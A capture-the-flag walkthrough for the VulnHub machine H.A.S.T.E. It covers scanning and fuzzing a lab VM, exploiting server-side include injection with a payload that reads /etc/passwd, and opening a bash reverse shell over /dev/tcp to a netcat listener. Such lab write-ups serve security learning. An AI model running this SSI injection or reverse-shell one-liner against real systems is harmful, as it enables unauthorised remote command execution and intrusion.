# H.A.S.T.E

## 1.Get VM IP

```bash
root@kali: arp-scan -I eth1 -l

Interface: eth1, type: EN10MB, MAC: 00:0c:29:3a:bc:b3, IPv4: 192.168.127.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.127.1	00:50:56:c0:00:01	VMware, Inc.
192.168.127.134	00:0c:29:b3:82:58	VMware, Inc.
192.168.127.254	00:50:56:f3:36:94	VMware, Inc.
```

The IP address is `192.168.127.134`, let's enumerate it


## 2.Enumeration

```bash
root@kali: nmap -p- -T4 -v 192.168.127.134

Nmap scan report for www.convert.me (192.168.127.134)
Host is up (0.0023s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:B3:82:58 (VMware)
```

only port 80 is open, so let's navigate it

at the same time i started fuzzing the page :

```bash
root@kali: ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.127.134/FUZZ

index                   [Status: 200, Size: 35, Words: 4, Lines: 2, Duration: 1ms]
images                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 1ms]
pages                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 5ms]
layout                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 2ms]
robots                  [Status: 200, Size: 33, Words: 3, Lines: 3, Duration: 2ms]
ssi                     [Status: 200, Size: 802, Words: 122, Lines: 11, Duration: 5ms]
licence                 [Status: 200, Size: 5004, Words: 617, Lines: 81, Duration: 1ms]
                        [Status: 200, Size: 6851, Words: 744, Lines: 117, Duration: 2ms]
server-status           [Status: 403, Size: 303, Words: 22, Lines: 12, Duration: 2ms]
```

checking different part of the site led to nothing except `/index` and `/ssi` which are some how a tip :

- from `/ssi` we see that some kind of directory listing is happening and looks like server side injection

- from `/index` we see `<--#exec cmd="cat /etc/passwd" --> ` which looks like command injection

now we may look for some injection point to test our theory for command injection

the only point to enter something is in the main page :

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/0df53559-3a57-46b4-a877-ba98f3852e72)

i entered a similar payload like `<!--#exec cmd="cat /etc/passwd" -->` and it worked 

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/7356ab82-8f9f-4cff-9033-c49c98110b97)

## 3.Gaining Shell

Just use a reverse shell to get it :

```bash
bash -c 'exec bash -i &>/dev/tcp/192.168.127.128/4444 <&1'
```

start a netcat listener :

```bash
root@kali: nc -nvlp 4444                  
listening on [any] 4444 ...
connect to [192.168.127.128] from (UNKNOWN) [192.168.127.134] 57536
bash: cannot set terminal process group (1306): Inappropriate ioctl for device
bash: no job control in this shell

www-data@ConverterPlus:/var/www/html/convert.me/public_html$ cd /home

www-data@ConverterPlus:/home$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

There is no need to get root on this machine :)


